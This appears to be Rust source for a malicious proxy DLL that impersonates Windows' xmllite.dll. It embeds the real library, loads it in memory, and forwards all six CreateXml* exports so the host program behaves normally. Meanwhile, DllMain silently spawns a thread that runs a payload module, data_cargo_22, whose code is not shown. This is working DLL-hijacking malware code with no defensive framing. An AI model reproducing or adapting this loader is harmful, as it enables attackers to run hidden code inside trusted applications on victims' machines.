#[cfg(not(target_os = "windows"))]
compile_error!("This crate requires 64 bit Windows target to compile");

#[macro_use]
extern crate lazy_static;

use std::collections::HashMap;
use std::io::Write;
use std::os::raw::c_void;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::ptr;

use memexec::memexec_dll;
use memexec::peloader::def::DLL_PROCESS_ATTACH;
use winapi::ctypes::c_void as void;
use winapi::shared::guiddef::REFIID;
use winapi::shared::minwindef::*;
use winapi::um::consoleapi::AllocConsole;
use winapi::um::objidlbase::{IMalloc, ISequentialStream};
use winapi::um::processthreadsapi::*;
use winapi::um::unknwnbase::IUnknown;
use winapi::um::winnt::{HRESULT, PROCESS_TERMINATE, WCHAR};
use random_string::generate;
use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};

type UnknownType = c_void;

#[cfg(not(target_arch = "x86_64"))]
const IMAGE: &'static [u8] = include_bytes!("../bin/xmllite_32.dll");

#[cfg(target_arch = "x86_64")]
const IMAGE: &'static [u8] = include_bytes!("../bin/xmllite_64.dll");

lazy_static! {
    pub static ref EXPORTS: HashMap<String, usize> = unsafe {
        memexec_dll(IMAGE, 0 as _, DLL_PROCESS_ATTACH, 0 as _).unwrap()
    };
}

macro_rules! originate {
    ($name:literal, $F:ty, $( $arg:ident ),* ) => {
        {
            let addr = EXPORTS.get($name).unwrap();
            let ptr = *addr as *const c_void;
            let f: $F = unsafe { std::mem::transmute(ptr) };
            let result = f(
                $($arg,)*
            );
            result
        }
    };
}

unsafe extern "system" fn main(_lp_param: LPVOID) -> DWORD {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();

    runtime.block_on(async move {
        data_cargo_22::main().await;
    });

    0
}

#[no_mangle]
pub extern "stdcall" fn DllMain(hinst_dll: HINSTANCE, fdw_reason: DWORD, _lpv_reserved: LPVOID) -> BOOL {
    match fdw_reason {
        DLL_PROCESS_ATTACH => unsafe {
            // AllocConsole();

            CreateThread(
                ptr::null_mut(),
                0,
                Some(main),
                hinst_dll as LPVOID,
                0,
                ptr::null_mut(),
            );

            let _ = EXPORTS.len();
        },

        _ => {
            // do smth else idk
        }
    }

    TRUE
}

#[no_mangle]
pub extern "C" fn CreateXmlReader(
    riid: REFIID,
    ppv_object: *mut *mut void,
    p_malloc: *mut IMalloc,
) -> HRESULT {
    originate!(
        "CreateXmlReader",
        extern "C" fn(REFIID, *mut *mut void, *mut IMalloc) -> HRESULT,
        riid,
        ppv_object,
        p_malloc
    )
}

#[no_mangle]
pub extern "C" fn CreateXmlReaderInputWithEncodingCodePage(
    p_input_stream: *mut IUnknown,
    p_malloc: *mut IMalloc,
    n_encoding_code_page: UINT,
    f_encoding_hint: BOOL,
    pwsz_base_uri: *const WCHAR,
    pp_input: *mut *mut UnknownType,
) -> HRESULT {
    originate!(
        "CreateXmlReaderInputWithEncodingCodePage",
        extern "C" fn(
            *mut IUnknown,
            *mut IMalloc,
            UINT,
            BOOL,
            *const WCHAR,
            *mut *mut UnknownType,
        ) -> HRESULT,
        p_input_stream,
        p_malloc,
        n_encoding_code_page,
        f_encoding_hint,
        pwsz_base_uri,
        pp_input
    )
}

#[no_mangle]
pub extern "C" fn CreateXmlReaderInputWithEncodingName(
    p_input_stream: *mut IUnknown,
    p_malloc: *mut IMalloc,
    pwsz_encoding_name: *const WCHAR,
    f_encoding_hint: BOOL,
    pwsz_base_uri: *const WCHAR,
    pp_input: *mut *mut UnknownType,
) -> HRESULT {
    originate!(
        "CreateXmlReaderInputWithEncodingName",
        extern "C" fn(
            *mut IUnknown,
            *mut IMalloc,
            *const WCHAR,
            BOOL,
            *const WCHAR,
            *mut *mut UnknownType,
        ) -> HRESULT,
        p_input_stream,
        p_malloc,
        pwsz_encoding_name,
        f_encoding_hint,
        pwsz_base_uri,
        pp_input
    )
}

#[no_mangle]
pub extern "C" fn CreateXmlWriter(
    riid: REFIID,
    ppv_object: *mut *mut void,
    p_malloc: *mut IMalloc,
) -> HRESULT {
    originate!(
        "CreateXmlWriter",
        extern "C" fn(REFIID, *mut *mut void, *mut IMalloc) -> HRESULT,
        riid,
        ppv_object,
        p_malloc
    )
}

#[no_mangle]
pub extern "C" fn CreateXmlWriterOutputWithEncodingCodePage(
    p_stream: *mut ISequentialStream,
    p_malloc: *mut IMalloc,
    n_encoding_code_page: UINT,
    pp_output: *mut *mut UnknownType,
) -> HRESULT {
    originate!(
        "CreateXmlWriterOutputWithEncodingCodePage",
        extern "C" fn(*mut ISequentialStream, *mut IMalloc, UINT, *mut *mut UnknownType) -> HRESULT,
        p_stream,
        p_malloc,
        n_encoding_code_page,
        pp_output
    )
}

// const WCHAR * pwsz_encoding_name, IXmlWriterOutput ** pp_output
#[no_mangle]
pub extern "C" fn CreateXmlWriterOutputWithEncodingName(
    p_stream: *mut ISequentialStream,
    p_malloc: *mut IMalloc,
    pwsz_encoding_name: *const WCHAR,
    pp_output: *mut *mut UnknownType,
) -> HRESULT {
    originate!(
        "CreateXmlWriterOutputWithEncodingName",
        extern "C" fn(
            *mut ISequentialStream,
            *mut IMalloc,
            *const WCHAR,
            *mut *mut UnknownType,
        ) -> HRESULT,
        p_stream,
        p_malloc,
        pwsz_encoding_name,
        pp_output
    )
}
